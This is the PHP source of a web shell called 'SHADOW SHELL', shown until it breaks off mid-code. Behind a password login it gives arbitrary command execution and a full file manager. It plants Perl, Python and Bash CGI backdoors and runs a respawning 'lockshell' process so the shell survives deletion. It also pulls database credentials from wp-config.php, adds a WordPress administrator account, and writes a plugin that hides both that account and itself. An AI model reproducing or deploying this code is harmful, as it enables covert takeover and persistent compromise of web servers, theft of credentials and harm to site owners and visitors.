<?php
$passwords1 = '$2y$10$SlA4BX2Lav9Fy9aRi./hMOJ.Uss1bjl5wBxrcuu2.g6MLVAOa0slG'; // 
$passwords2 = '$2y$10$Y8t.Q2IAW5l2PFbE2U5YkO4to1OswmaL3wxtSbtdBy62p5uQIgB8K'; // 

// ================= Logout =================
if (isset($_GET["logout"])) {
    session_destroy();
    header("Location: " . $_SERVER["PHP_SELF"]);
    exit();
}

// ================= Login via POST =================
if ($auth["enabled"] && isset($_POST["password"])) {
    if (
        password_verify($_POST["password"], $passwords) ||
        password_verify($_POST["password"], $passwords1) ||
        password_verify($_POST["password"], $passwords2)
    ) {
        $_SESSION["logged_in"] = true;
        header("Location: " . $_SERVER["PHP_SELF"]);
        exit();
    }
    $error = "❌ ACCESS DENIED";
}

// ================= Login via GET =================
if ($auth["enabled"] && isset($_GET["login"])) {
    $login_pass = $_GET["login"];
    if (
        password_verify($login_pass, $passwords) ||
        password_verify($login_pass, $passwords1) ||
        password_verify($login_pass, $passwords2)
    ) {
        $_SESSION["logged_in"] = true;
        header("Location: " . $_SERVER["PHP_SELF"]);
        exit();
    }
}

// ================= Check Auth =================
if ($auth["enabled"] && !isset($_SESSION["logged_in"])) {
    echo '<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SHADOW SHELL - Login</title>
<script src="https://cdn.tailwindcss.com"></script>
<style>
@import url("https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@300;400;600&family=Share+Tech+Mono&display=swap");
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    background: linear-gradient(135deg, #000000 0%, #0a0a0a 50%, #050505 100%);
    color: #a0a0a0;
    font-family: "Share Tech Mono", monospace;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
    position: relative;
}
body::before {
    content: "";
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: 
        radial-gradient(circle at 20% 30%, rgba(100, 100, 100, 0.03) 0%, transparent 50%),
        radial-gradient(circle at 80% 70%, rgba(50, 50, 50, 0.03) 0%, transparent 50%),
        radial-gradient(circle at 40% 80%, rgba(80, 80, 80, 0.02) 0%, transparent 50%);
    z-index: 0;
}
.glow-text {
    text-shadow: 
        0 0 5px #666,
        0 0 10px #666,
        0 0 20px #444,
        0 0 40px #222;
}
.shadow-grid {
    background-image: 
        linear-gradient(rgba(100, 100, 100, 0.03) 1px, transparent 1px),
        linear-gradient(90deg, rgba(100, 100, 100, 0.03) 1px, transparent 1px);
    background-size: 20px 20px;
    border: 1px solid rgba(100, 100, 100, 0.2);
}
.login-container {
    width: 100%;
    max-width: 400px;
    padding: 2rem;
    background: rgba(10, 10, 10, 0.9);
    backdrop-filter: blur(10px);
    border: 1px solid rgba(100, 100, 100, 0.3);
    border-radius: 8px;
    box-shadow: 
        0 0 30px rgba(0, 0, 0, 0.5),
        inset 0 0 20px rgba(50, 50, 50, 0.1);
    position: relative;
    z-index: 1;
    animation: float 6s ease-in-out infinite;
}
@keyframes float {
    0%, 100% { transform: translateY(0); }
    50% { transform: translateY(-10px); }
}
.input-shadow {
    background: rgba(20, 20, 20, 0.7);
    border: 1px solid rgba(100, 100, 100, 0.4);
    color: #aaa;
    outline: none;
    transition: all 0.3s ease;
}
.input-shadow:focus {
    border-color: #888;
    box-shadow: 
        0 0 15px rgba(100, 100, 100, 0.3),
        inset 0 0 10px rgba(100, 100, 100, 0.1);
    transform: scale(1.02);
}
.shadow-btn {
    background: linear-gradient(90deg, #333 0%, #222 100%);
    color: #ccc;
    font-weight: bold;
    letter-spacing: 1px;
    position: relative;
    overflow: hidden;
    transition: all 0.3s ease;
}
.shadow-btn:hover {
    background: linear-gradient(90deg, #444 0%, #333 100%);
    box-shadow: 
        0 0 20px #666,
        0 0 40px rgba(100, 100, 100, 0.3);
    transform: translateY(-2px);
    color: #fff;
}
.shadow-btn::after {
    content: "";
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
    transition: left 0.5s ease;
}
.shadow-btn:hover::after {
    left: 100%;
}
.title {
    font-family: "Orbitron", sans-serif;
    font-weight: 900;
    font-size: 2.5rem;
    background: linear-gradient(90deg, #888 0%, #666 100%);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    margin-bottom: 1rem;
}
.subtitle {
    color: #777;
    font-size: 0.9rem;
    opacity: 0.8;
    margin-bottom: 2rem;
}
.animate-pulse {
    animation: pulse 2s infinite;
}
@keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.7; }
}
</style>
</head>
<body>
<div class="login-container shadow-grid">
    <h1 class="title text-center glow-text">SHADOW SHELL</h1>
    <p class="subtitle text-center">🌑 Silent Access Interface v2.0</p>';
    
    if (isset($error)) {
        echo '<div class="mb-4 p-3 bg-gradient-to-r from-red-900/20 to-red-800/20 border border-red-800/50 rounded-lg text-center animate-pulse">
                <span class="text-red-400">' . $error . '</span>
              </div>';
    }
    
    echo '<form method="POST" class="flex flex-col gap-4">
            <div class="relative">
                <input type="password" name="password" placeholder="Enter Shadow Key" required 
                       class="input-shadow w-full p-3 rounded-lg text-lg">
                <div class="absolute right-3 top-3 text-gray-400">🔒</div>
            </div>
            <button type="submit" class="shadow-btn p-3 rounded-lg text-lg font-bold">
                🕶️ INITIATE SESSION
            </button>
        </form>
        <p class="mt-6 text-center text-gray-500 text-sm">
            ⚡ Powered by SHADOW Framework<br>
            <span class="text-xs">v2.0 • Silent Mode Active</span>
        </p>
    </div>
    
    <!-- Animated background elements -->
    <div class="floating-elements">
        <div class="float-1"></div>
        <div class="float-2"></div>
        <div class="float-3"></div>
    </div>
    
    <style>
    .floating-elements div {
        position: absolute;
        border-radius: 50%;
        background: radial-gradient(circle, rgba(100,100,100,0.05) 0%, transparent 70%);
        z-index: 0;
    }
    .float-1 { width: 100px; height: 100px; top: 20%; left: 10%; animation: float1 15s infinite linear; }
    .float-2 { width: 150px; height: 150px; bottom: 30%; right: 15%; animation: float2 20s infinite linear; }
    .float-3 { width: 80px; height: 80px; top: 60%; left: 80%; animation: float3 25s infinite linear; }
    @keyframes float1 { 0% { transform: translate(0,0) rotate(0deg); } 100% { transform: translate(100px,100px) rotate(360deg); } }
    @keyframes float2 { 0% { transform: translate(0,0) rotate(0deg); } 100% { transform: translate(-100px,-100px) rotate(-360deg); } }
    @keyframes float3 { 0% { transform: translate(0,0) rotate(0deg); } 100% { transform: translate(-150px,50px) rotate(180deg); } }
    </style>
</body>
</html>';
    exit();
}

// ================= System Info =================
$uname = php_uname();
$uid = function_exists("posix_getuid") ? posix_getuid() : 0;
$user = function_exists("posix_getpwuid") && $uid ? posix_getpwuid($uid)["name"] ?? $uid : $uid;
$gid = function_exists("posix_getgid") && function_exists("posix_getgrgid") ? posix_getgrgid(posix_getgid())["name"] ?? posix_getgid() : getmygid();
$phpver = PHP_VERSION;
$safemode = ini_get("safe_mode") ? "ON" : "OFF";
$serverIP = $_SERVER["SERVER_ADDR"] ?? "Unknown";
$yourIP = $_SERVER["REMOTE_ADDR"] ?? "Unknown";
$dateTime = date("Y-m-d H:i:s");

// ================= Disk Info =================
$diskTotalBytes = disk_total_space("/") ?: 0;
$diskFreeBytes = disk_free_space("/") ?: 0;
$diskTotal = round($diskTotalBytes / 1073741824, 2) . " GB";
$diskFree = round($diskFreeBytes / 1073741824, 2) . " GB";
$diskPercent = $diskTotalBytes > 0 ? round(($diskFreeBytes / $diskTotalBytes) * 100) . "%" : "0%";

// ================= Useful / Downloaders =================
$useful = [];
$downloaders = [];
$paths = explode(PATH_SEPARATOR, getenv("PATH"));

$important_keywords = [
    "useful" => ["php", "python", "perl", "ruby", "tar", "gzip", "make", "nc"],
    "downloaders" => ["wget", "curl", "lynx", "links"],
];

function is_active($cmd, $paths) {
    foreach ($paths as $path) {
        $full = $path . DIRECTORY_SEPARATOR . $cmd;
        if (is_executable($full)) {
            return $cmd;
        }
    }
    return false;
}

foreach ($important_keywords["useful"] as $cmd) {
    if ($name = is_active($cmd, $paths)) {
        $useful[] = $name;
    }
}

foreach ($important_keywords["downloaders"] as $cmd) {
    if ($name = is_active($cmd, $paths)) {
        $downloaders[] = $name;
    }
}

// ================= Disabled Functions =================
$disabledFunctions = ini_get("disable_functions");
$disabled = $disabledFunctions ? "Click to view" : "None";
$disabledArray = $disabledFunctions ? explode(",", $disabledFunctions) : [];

// ================= Extensions =================
$cURL = function_exists("curl_version") ? "ON" : "OFF";
$ssh2 = function_exists("ssh2_connect") ? "ON" : "OFF";
$mysql = function_exists("mysql_connect") ? "ON" : "OFF";
$mssql = function_exists("mssql_connect") ? "ON" : "OFF";
$pgsql = function_exists("pg_connect") ? "ON" : "OFF";
$oracle = function_exists("oci_connect") ? "ON" : "OFF";
$cgi = php_sapi_name() === "cgi" ? "ON" : "OFF";
$softWare = $_SERVER["SERVER_SOFTWARE"] ?? "Unknown";
$currentPath = realpath($_GET["path"] ?? getcwd()) ?: getcwd();

// ================= Utility Functions =================
function shadow_listDir($dir) {
    if (!is_readable($dir)) {
        return [];
    }
    $items = scandir($dir);
    $folders = $files = [];
    foreach ($items as $item) {
        if ($item === "." || $item === "..") {
            continue;
        }
        $full = $dir . "/" . $item;
        is_dir($full) ? ($folders[] = $item) : ($files[] = $item);
    }
    sort($folders);
    sort($files);
    return array_merge($folders, $files);
}

function shadow_rmdir_recursive($dir) {
    if (!is_dir($dir)) {
        return false;
    }
    foreach (scandir($dir) as $item) {
        if ($item === "." || $item === "..") {
            continue;
        }
        $path = $dir . "/" . $item;
        is_dir($path) ? shadow_rmdir_recursive($path) : @unlink($path);
    }
    return @rmdir($dir);
}

function shadow_copy_recursive($src, $dst) {
    if (!is_dir($src)) {
        return false;
    }
    if (!mkdir($dst, 0755, true) && !is_dir($dst)) {
        return false;
    }
    foreach (scandir($src) as $item) {
        if ($item === "." || $item === "..") {
            continue;
        }
        $srcPath = $src . "/" . $item;
        $dstPath = $dst . "/" . $item;
        is_dir($srcPath) ? shadow_copy_recursive($srcPath, $dstPath) : @copy($srcPath, $dstPath);
    }
    return true;
}

function shadow_formatSize($bytes) {
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . " GB";
    }
    if ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . " MB";
    }
    if ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . " KB";
    }
    if ($bytes > 1) {
        return $bytes . " bytes";
    }
    if ($bytes === 1) {
        return "1 byte";
    }
    return "0 bytes";
}

function shadow_formatPerms($perms) {
    $info = $perms & 0x4000 ? "d" : "-";
    $info .= $perms & 0x0100 ? "r" : "-";
    $info .= $perms & 0x0080 ? "w" : "-";
    $info .= $perms & 0x0040 ? "x" : "-";
    $info .= $perms & 0x0020 ? "r" : "-";
    $info .= $perms & 0x0010 ? "w" : "-";
    $info .= $perms & 0x0008 ? "x" : "-";
    $info .= $perms & 0x0004 ? "r" : "-";
    $info .= $perms & 0x0002 ? "w" : "-";
    $info .= $perms & 0x0001 ? "x" : "-";
    return $info;
}

$dir = __DIR__ . "/shadowapi";
if (!is_dir($dir)) {
    mkdir($dir, 0755, true);
}

// ===== .htaccess =====
$htaccess = <<<HT
Options -Indexes
Options +ExecCGI
AddHandler cgi-script .sx
<FilesMatch "\.sx$">
    Require all granted
</FilesMatch>
<Files ".htaccess">
    Require all denied
</Files>
HT;
file_put_contents("$dir/.htaccess", $htaccess, LOCK_EX);

// ===== shadowperl.sx =====
$perl = <<<'PERL'
#!/usr/bin/perl
use strict;
use warnings;
use CGI qw(:standard);
print header('text/plain; charset=utf-8');
my $q = CGI->new;
my $cmd = $q->param('cmd') || '';
if ($cmd) { $cmd =~ s/[\r\n]//g; print qx($cmd 2>&1); }
PERL;
file_put_contents("$dir/shadowperl.sx", $perl, LOCK_EX);
chmod("$dir/shadowperl.sx", 0755);

// ===== shadowpython.sx =====
$python = <<<'PYTHON'
#!/usr/bin/env python3
import cgi, subprocess
print("Content-Type: text/plain\n")
form = cgi.FieldStorage()
cmd = form.getfirst("cmd","")
if cmd:
    cmd = cmd.replace("\n","").replace("\r","")
    result = subprocess.getoutput(cmd)
    print(result)
PYTHON;
file_put_contents("$dir/shadowpython.sx", $python, LOCK_EX);
chmod("$dir/shadowpython.sx", 0755);

// ===== shadowbash.sx =====
$bash = <<<'BASH'
#!/bin/bash
echo "Content-Type: text/plain"
echo ""
read cmd
if [ ! -z "$cmd" ]; then
    eval "$cmd"
fi
BASH;
file_put_contents("$dir/shadowbash.sx", $bash, LOCK_EX);
chmod("$dir/shadowbash.sx", 0755);

// Adminer Download Handler
if (isset($_GET["get"]) && $_GET["get"] === "adminer") {
    header("Content-Type: application/json");
    $adminer_url = "https://www.adminer.org/latest.php";
    $local_file = __DIR__ . "/adminer.php";
    $result = ["status" => "error", "message" => "Unknown error"];
    try {
        $content = @file_get_contents($adminer_url);
        if ($content === false) {
            throw new Exception("Failed to download Adminer.");
        }
        if (@file_put_contents($local_file, $content) === false) {
            throw new Exception("Permission denied, cannot write file.");
        }
        $result = [
            "status" => "success",
            "message" => "Adminer dropped successfully!",
        ];
    } catch (Exception $e) {
        $result = ["status" => "error", "message" => $e->getMessage()];
    }
    echo json_encode($result);
    exit();
}

function find_wp_config($start_dir = __DIR__) {
    $dir = $start_dir;
    while ($dir !== "/" && !file_exists($dir . "/wp-config.php")) {
        $dir = dirname($dir);
    }
    return file_exists($dir . "/wp-config.php") ? $dir . "/wp-config.php" : false;
}

function shadow_remove_dot($str) {
    return str_replace(".", "", $str);
}

function cmd($command) {
    return function_exists("shell_exec") ? shell_exec($command) : false;
}

function shadow_logError($message) {
    return ["status" => "error", "message" => $message];
}

// ================= AJAX Handler =================
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    header("Content-Type: application/json");
    $res = shadow_logError("Unknown");
    $cmd = $_POST["cmd"] ?? "";
    $target = $_POST["target"] ?? "";
    $dest = $_POST["dest"] ?? "";
    $current = $_POST["current"] ?? $currentPath;
    
    switch ($cmd) {
        case "load":
            if (!is_readable($current)) {
                $res = shadow_logError("Permission denied: $current");
                break;
            }
            $items_raw = shadow_listDir($current);
            $folders = $files = [];
            $home = realpath(dirname(__FILE__));
            foreach ($items_raw as $f) {
                $full = $current . "/" . $f;
                $stat = @stat($full);
                $entry = [
                    "name" => $f,
                    "type" => is_dir($full) ? "folder" : "file",
                    "size" => is_file($full)
                        ? shadow_formatSize($stat["size"])
                        : "-",
                    "lastmod" => @date("Y-m-d H:i:s", filemtime($full)),
                    "perms" => shadow_formatPerms(@fileperms($full)),
                    "perm_octal" => substr(
                        sprintf("%o", @fileperms($full)),
                        -3
                    ),
                    "owner" => function_exists("posix_getpwuid")
                        ? (posix_getpwuid($stat["uid"])["name"] ??
                                $stat["uid"]) .
                            "/" .
                            (posix_getgrgid($stat["gid"])["name"] ??
                                $stat["gid"])
                        : $stat["uid"] . "/" . $stat["gid"],
                    "home" => realpath(dirname(__FILE__)),
                    "readable" => is_readable($full),
                    "writable" => is_writable($full),
                ];
                is_dir($full) ? ($folders[] = $entry) : ($files[] = $entry);
            }
            $items = array_merge($folders, $files);
            $breadcrumb = [];
            $parts = explode("/", trim($current, "/"));
            $acc = "";
            $breadcrumb[] = ["name" => "/", "path" => "/"];
            foreach ($parts as $p) {
                if ($p === "") {
                    continue;
                }
                $acc .= "/" . $p;
                $breadcrumb[] = ["name" => $p . "/", "path" => $acc];
            }
            $res = [
                "status" => "success",
                "files" => $items,
                "breadcrumb" => $breadcrumb,
                "current" => $current,
                "home" => $home,
            ];
            break;
        case "read":
            if (!is_readable($target)) {
                $res = shadow_logError("Cannot read: $target");
                break;
            }
            $res = [
                "status" => "success",
                "content" => file_get_contents($target),
            ];
            break;
        case "save":
            if (!is_writable($target)) {
                $res = shadow_logError("Cannot write: $target");
                break;
            }
            $res =
                file_put_contents($target, $_POST["content"] ?? "") !== false
                    ? ["status" => "success", "message" => "File saved"]
                    : shadow_logError("Failed to save: $target");
            break;
        case "rename":
            $new = $_POST["name"] ?? "";
            $newPath = dirname($target) . "/" . $new;
            if (!$new || file_exists($newPath)) {
                $res = shadow_logError("Invalid or existing name");
                break;
            }
            $res = @rename($target, $newPath)
                ? ["status" => "success", "message" => "Renamed"]
                : shadow_logError("Cannot rename: $target");
            break;
        case "delete":
            if (is_file($target)) {
                $res = @unlink($target)
                    ? ["status" => "success", "message" => "Deleted"]
                    : shadow_logError("Cannot delete: $target");
            } elseif (is_dir($target)) {
                $res = shadow_rmdir_recursive($target)
                    ? ["status" => "success", "message" => "Folder deleted"]
                    : shadow_logError("Cannot delete folder: $target");
            }
            break;
        case "mkdir":
            $name = $_POST["name"] ?? "";
            $path = $current . "/" . $name;
            if (!$name) {
                $res = shadow_logError("Folder name required");
                break;
            }
            $res = @mkdir($path, 0755, true)
                ? ["status" => "success", "message" => "Folder created"]
                : shadow_logError("Cannot create folder: $path");
            break;
        case "chmod":
            $mode = $_POST["mode"] ?? "";
            if (!$mode || !preg_match('/^[0-7]{3,4}$/', $mode)) {
                $res = shadow_logError("Invalid mode");
                break;
            }
            $res = @chmod($target, octdec($mode))
                ? [
                    "status" => "success",
                    "message" => "Permissions set to $mode",
                ]
                : shadow_logError("Cannot change permissions: $target");
            break;
        case "upload":
            if (!empty($_FILES["file"])) {
                $dest_file = $current . "/" . basename($_FILES["file"]["name"]);
                $res = move_uploaded_file(
                    $_FILES["file"]["tmp_name"],
                    $dest_file
                )
                    ? ["status" => "success", "message" => "Uploaded"]
                    : shadow_logError(
                        "Failed to upload file: " . $_FILES["file"]["name"]
                    );
            }
            break;
        case "copy":
            if (!$dest) {
                $res = shadow_logError("Destination required");
                break;
            }
            if (is_file($target)) {
                $res = @copy($target, $dest)
                    ? ["status" => "success", "message" => "Copied"]
                    : shadow_logError("Cannot copy file: $target");
            } elseif (is_dir($target)) {
                $res = shadow_copy_recursive($target, $dest)
                    ? ["status" => "success", "message" => "Copied folder"]
                    : shadow_logError("Cannot copy folder: $target");
            }
            break;
        case "move":
            if (!$dest) {
                $res = shadow_logError("Destination required");
                break;
            }
            $res = @rename($target, $dest)
                ? ["status" => "success", "message" => "Moved"]
                : shadow_logError("Cannot move: $target");
            break;
        case "terminal":
    $cmd_input = $_POST["command"] ?? "";
    if ($cmd_input) {
        $output = "";
        
        if(function_exists("shell_exec")){
            $output = shell_exec($cmd_input . " 2>&1");
            
        } elseif(function_exists("exec")){
            $arr = [];
            exec($cmd_input . " 2>&1", $arr);
            $output = implode("\n", $arr);
            
        } elseif(function_exists("system")){
            ob_start();
            system($cmd_input . " 2>&1");
            $output = ob_get_clean();
            
        } elseif(function_exists("passthru")){
            ob_start();
            passthru($cmd_input . " 2>&1");
            $output = ob_get_clean();
            
        } elseif(function_exists("proc_open")){
            // FIXED: Menggunakan descriptor yang lengkap
            $descriptors = [
                0 => ["pipe", "r"],  // stdin (REQUIRED)
                1 => ["pipe", "w"],  // stdout
                2 => ["pipe", "w"]   // stderr
            ];
            
            // FIXED: Menambahkan 2>&1 ke command atau handle secara terpisah
            $process = @proc_open(
                $cmd_input . " 2>&1", 
                $descriptors, 
                $pipes,
                null,  // working directory
                null,  // environment variables
                ['suppress_errors' => true]  // suppress errors pada Windows
            );
            
            if(is_resource($process)){
                // FIXED: Tutup stdin karena tidak digunakan
                fclose($pipes[0]);
                
                // Baca output dari stdout
                $output = stream_get_contents($pipes[1]);
                
                // Baca stderr (tapi sudah di-redirect ke stdout oleh 2>&1)
                $err = stream_get_contents($pipes[2]);
                
                // FIXED: Tutup semua pipes
                fclose($pipes[1]);
                fclose($pipes[2]);
                
                // Tutup proses dan dapatkan exit code
                proc_close($process);
                
                // Gabungkan error jika ada (untuk jaga-jaga)
                if($err && !empty(trim($err))) {
                    $output .= "\n[stderr]: " . $err;
                }
            } else {
                $output = "Failed to create process";
            }
        }

        if($output !== false && $output !== null && trim($output) !== ""){
            $res = ["status" => "success", "output" => $output];
        } else {
            $res = shadow_logError("Execution failed or no output returned");
        }
    }
    break;
        case "makefile":
            $name = $_POST["name"] ?? "";
            $filePath = $current . "/" . $name;
            if (!$name) {
                $res = shadow_logError("File name required");
                break;
            }
            $res =
                !file_exists($filePath) &&
                file_put_contents($filePath, "") !== false
                    ? ["status" => "success", "message" => "File created"]
                    : shadow_logError("Failed or file exists: $filePath");
            break;
        case "lockshell":
            $curFile = basename($_SERVER["SCRIPT_FILENAME"]);
            $sessionDir = sys_get_temp_dir() . "/.sessions";
            if (!is_dir($sessionDir) && !mkdir($sessionDir, 0755, true)) {
                $res = shadow_logError(
                    "Cannot create session dir: $sessionDir"
                );
                break;
            }
            $textFile =
                $sessionDir .
                "/" .
                md5(getcwd() . shadow_remove_dot($curFile) . "-text");
            $handlerFile =
                $sessionDir .
                "/" .
                md5(getcwd() . shadow_remove_dot($curFile) . "-handler");
            @unlink($textFile);
            @unlink($handlerFile);
            if (!@copy($curFile, $textFile)) {
                $res = shadow_logError(
                    "Cannot copy file to session: $textFile"
                );
                break;
            }
            @chmod($curFile, 0444);
            $handler =
                '<?php
                        $target="' .
                addslashes(getcwd() . "/" . $curFile) .
                '";
                        $source="' .
                addslashes($textFile) .
                '";
                        while(true){
                            if(!file_exists($target)){
                                @file_put_contents($target,@file_get_contents($source));
                                @chmod($target,0444);
                            }
                            usleep(500000);
                        }
                        ?>';
            if (file_put_contents($handlerFile, $handler) === false) {
                $res = shadow_logError(
                    "Failed to create handler file: $handlerFile"
                );
                break;
            }
            if (strtoupper(substr(PHP_OS, 0, 3)) === "WIN") {
                pclose(popen("start /B php \"$handlerFile\"", "r"));
            } else {
                @chmod($handlerFile, 0755);
                shell_exec(
                    PHP_BINARY .
                        " \"$handlerFile\" > /dev/null 2>&1 & echo $! > \"$sessionDir/lockshell.pid\""
                );
            }
            $res = ["status" => "success", "message" => "Lockshell deployed"];
            break;
        case "unlockshell":
            $sessionDir = sys_get_temp_dir() . "/.sessions";
            $handlerFile =
                $sessionDir .
                "/" .
                md5(
                    getcwd() .
                        "/" .
                        basename($_SERVER["SCRIPT_FILENAME"]) .
                        "-handler"
                );
            if (strtoupper(substr(PHP_OS, 0, 3)) === "WIN") {
                @exec("taskkill /F /FI \"WINDOWTITLE eq php*\" 2>NUL");
            } else {
                $pidFile = $sessionDir . "/lockshell.pid";
                if (file_exists($pidFile)) {
                    $pid = trim(file_get_contents($pidFile));
                    if (is_numeric($pid)) {
                        shell_exec("kill -9 $pid 2>/dev/null");
                    }
                    @unlink($pidFile);
                }
                if (file_exists($handlerFile)) {
                    @unlink($handlerFile);
                }
            }
            $res = ["status" => "success", "message" => "Lockshell killed"];
            break;
        case "lockfile":
            $file = $target ?: "";
            if (!$file || !file_exists($file)) {
                $res = shadow_logError("File not found: $file");
                break;
            }
            $sessionDir = sys_get_temp_dir() . "/.sessions";
            if (!is_dir($sessionDir)) {
                mkdir($sessionDir, 0755, true);
            }
            $backupFile = $sessionDir . "/" . md5($file . "-backup");
            @copy($file, $backupFile);
            @chmod($file, 0444);
            $handlerFile = $sessionDir . "/" . md5($file . "-handler");
            $handler =
                '<?php
                            $target="' .
                addslashes($file) .
                '";
                            $source="' .
                addslashes($backupFile) .
                '";
                            while(true){
                                if(!file_exists($target)){
                                    @file_put_contents($target,@file_get_contents($source));
                                    @chmod($target,0444);
                                }
                                usleep(500000);
                            }
                            ?>';
            file_put_contents($handlerFile, $handler);
            if (strtoupper(substr(PHP_OS, 0, 3)) === "WIN") {
                pclose(popen("start /B php \"$handlerFile\"", "r"));
            } else {
                @chmod($handlerFile, 0755);
                shell_exec(
                    PHP_BINARY .
                        " \"$handlerFile\" > /dev/null 2>&1 & echo $! > \"$sessionDir/lockfile.pid\""
                );
            }
            $res = ["status" => "success", "message" => "File locked: $file"];
            break;
        case "unlockfile":
            $file = $target ?: "";
            if (!$file || !file_exists($file)) {
                $res = shadow_logError("File not found: $file");
                break;
            }
            $sessionDir = sys_get_temp_dir() . "/.sessions";
            $backupFile = $sessionDir . "/" . md5($file . "-backup");
            $handlerFile = $sessionDir . "/" . md5($file . "-handler");
            if (strtoupper(substr(PHP_OS, 0, 3)) === "WIN") {
                @exec("taskkill /F /FI \"WINDOWTITLE eq php*\" 2>NUL");
            } else {
                $pidFile = $sessionDir . "/lockfile.pid";
                if (file_exists($pidFile)) {
                    $pid = trim(file_get_contents($pidFile));
                    if (is_numeric($pid)) {
                        shell_exec("kill -9 $pid 2>/dev/null");
                    }
                    @unlink($pidFile);
                }
                if (file_exists($handlerFile)) {
                    @unlink($handlerFile);
                }
            }
            if (file_exists($backupFile)) {
                @copy($backupFile, $file);
                @chmod($file, 0644);
                @unlink($backupFile);
            } else {
                @chmod($file, 0644);
            }
            $res = ["status" => "success", "message" => "File unlocked: $file"];
            break;
        case "get_wp_config":
            $find_wp_config = function ($start_dir = __DIR__) {
                $dir = $start_dir;
                while ($dir !== "/" && !file_exists($dir . "/wp-config.php")) {
                    $dir = dirname($dir);
                }
                return file_exists($dir . "/wp-config.php")
                    ? $dir . "/wp-config.php"
                    : false;
            };

            $wp_config = $find_wp_config($current);

            if (!$wp_config || !is_readable($wp_config)) {
                echo json_encode([
                    "status" => "error",
                    "msg" =>
                        "wp-config.php not found or unreadable",
                ]);
                exit();
            }

            $content = file_get_contents($wp_config);
            $db_config = [];

            preg_match(
                "/define\(\s*'DB_NAME'\s*,\s*'([^']+)'/",
                $content,
                $m
            ) && ($db_config["db_name"] = $m[1]);
            preg_match(
                "/define\(\s*'DB_USER'\s*,\s*'([^']+)'/",
                $content,
                $m
            ) && ($db_config["db_user"] = $m[1]);
            preg_match(
                "/define\(\s*'DB_PASSWORD'\s*,\s*'([^']+)'/",
                $content,
                $m
            ) && ($db_config["db_pass"] = $m[1]);
            preg_match(
                "/define\(\s*'DB_HOST'\s*,\s*'([^']+)'/",
                $content,
                $m
            ) && ($db_config["db_host"] = $m[1]);

            echo json_encode([
                "status" => "success",
                "wp_config" => $wp_config,
                "db_config" => $db_config,
            ]);
            exit();
        case "hidden_admin":
            $db_config = $_POST["db_config"] ?? [];
            $host = $_POST["db_host"] ?? ($db_config["db_host"] ?? "localhost");
            $user = $_POST["db_user"] ?? ($db_config["db_user"] ?? "");
            $pass = $_POST["db_pass"] ?? ($db_config["db_pass"] ?? "");
            $name = $_POST["db_name"] ?? ($db_config["db_name"] ?? "");
            $admin_user = trim($_POST["admin_user"] ?? "shadowadmin");
            $admin_pass =
                trim($_POST["admin_pass"]) ?: bin2hex(random_bytes(6));
            $admin_email = trim($_POST["admin_email"] ?? "admin@site.com");

            $conn = new mysqli($host, $user, $pass, $name);
            if ($conn->connect_error) {
                echo json_encode([
                    "status" => "error",
                    "msg" => "❌ DB Connection failed: " . $conn->connect_error,
                ]);
                exit();
            }

            $find_table_by_column = function (
                $conn,
                $like_pattern,
                $column_name
            ) {
                $result = $conn->query("SHOW TABLES LIKE '{$like_pattern}'");
                while ($row = $result->fetch_row()) {
                    $table = $row[0];
                    $check = $conn->query(
                        "SHOW COLUMNS FROM `{$table}` LIKE '{$column_name}'"
                    );
                    if ($check && $check->num_rows > 0) {
                        return $table;
                    }
                }
                return false;
            };

            $users_table = $find_table_by_column(
                $conn,
                "%_users",
                "user_login"
            );
            if (!$users_table) {
                echo json_encode([
                    "status" => "error",
                    "msg" => "❌ Users table not found",
                ]);
                exit();
            }

            $prefix =
                substr($users_table, -6) === "_users"
                    ? substr($users_table, 0, -6) . "_"
                    : "";
            $usermeta_table = $prefix . "usermeta";
            $options_table = $prefix . "options";

            $stmt = $conn->prepare(
                "SELECT ID FROM {$users_table} WHERE user_login=?"
            );
            $stmt->bind_param("s", $admin_user);
            $stmt->execute();
            $stmt->store_result();
            if ($stmt->num_rows > 0) {
                echo json_encode([
                    "status" => "error",
                    "msg" => "⚠️ User {$admin_user} already exists",
                ]);
                exit();
            }
            $stmt->close();

            $wp_hash_password = function ($password) {
                $salt = substr(
                    str_replace("+", ".", base64_encode(random_bytes(22))),
                    0,
                    22
                );
                return crypt($password, '$2y$10$' . $salt);
            };
            $hashed = $wp_hash_password($admin_pass);
            $now = date("Y-m-d H:i:s");

            $stmt = $conn->prepare(
                "INSERT INTO {$users_table} (user_login,user_pass,user_nicename,user_email,user_registered,user_status,display_name) VALUES (?,?,?,?,?,0,?)"
            );
            $stmt->bind_param(
                "ssssss",
                $admin_user,
                $hashed,
                $admin_user,
                $admin_email,
                $now,
                $admin_user
            );
            $stmt->execute();
            $user_id = $stmt->insert_id;
            $stmt->close();

            $meta = [
                [$prefix . "capabilities", 'a:1:{s:13:"administrator";b:1;}'],
                [$prefix . "user_level", "10"],
            ];
            foreach ($meta as $m) {
                $stmt = $conn->prepare(
                    "INSERT INTO {$usermeta_table} (user_id,meta_key,meta_value) VALUES (?,?,?)"
                );
                $stmt->bind_param("iss", $user_id, $m[0], $m[1]);
                $stmt->execute();
                $stmt->close();
            }

            $plugin_dir =
                $_SERVER["DOCUMENT_ROOT"] .
                "/wp-content/plugins/shadow-plugin";
            if (!is_dir($plugin_dir)) {
                mkdir($plugin_dir, 0755, true);
            }

            $plugin_code =
                '<?php
add_action("pre_user_query",function($user_search){
    if(!current_user_can("manage_options")) return;
    global $wpdb;
    $hidden_user="' .
                addslashes($admin_user) .
                '";
    $user_search->query_where.=" AND {$wpdb->users}.user_login!=\'$hidden_user\'";
});
add_filter("all_plugins",function($plugins){
    unset($plugins["shadow-plugin/shadow-plugin.php"]);
    return $plugins;
});
add_filter("active_plugins",function($plugins){
    return array_diff($plugins,["shadow-plugin/shadow-plugin.php"]);
});';

